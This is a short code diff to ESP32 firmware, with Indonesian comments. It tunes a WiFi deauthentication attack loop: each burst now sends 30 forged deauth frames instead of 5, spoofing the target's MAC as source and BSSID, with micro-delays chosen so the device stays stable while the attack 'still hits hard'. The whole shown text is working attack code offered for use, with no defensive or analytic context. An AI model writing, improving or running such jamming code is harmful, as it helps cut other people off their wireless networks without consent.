@@ -49,18 +49,23 @@ void loopWiFi(void * pvParameters) {
       uint8_t targetMac[6];
       stringToMac(targetTerkunci.mac, targetMac);
       
-      // Copy MAC ke paket (Source & BSSID)
       memcpy(&deauthPacket[10], targetMac, 6);
       memcpy(&deauthPacket[16], targetMac, 6);
       
       esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
       
-      // Tembak brutal!
-      for(int i=0; i<5; i++) {
+      // TEMBAK BANYAK SEKALIGUS (Satu Batch)
+      for(int i=0; i<30; i++) { 
         esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
-        vTaskDelay(10 / portTICK_PERIOD_MS); 
+        // Jeda super mikro biar radio gak panas tapi tetep kenceng
+        delayMicroseconds(500); 
       }
+      
+      // JEDA AGAK LAMA (Biar Core 0 bisa lapor ke Watchdog & Layar tetep mulus)
+      // 100ms udah cukup buat bikin sistem stabil tapi serangan tetep kerasa
+      vTaskDelay(100 / portTICK_PERIOD_MS); 
     }
+
     
      // Core 0 istirahat 50ms biar gak overheat sambil nunggu perintah
     vTaskDelay(50 / portTICK_PERIOD_MS); 
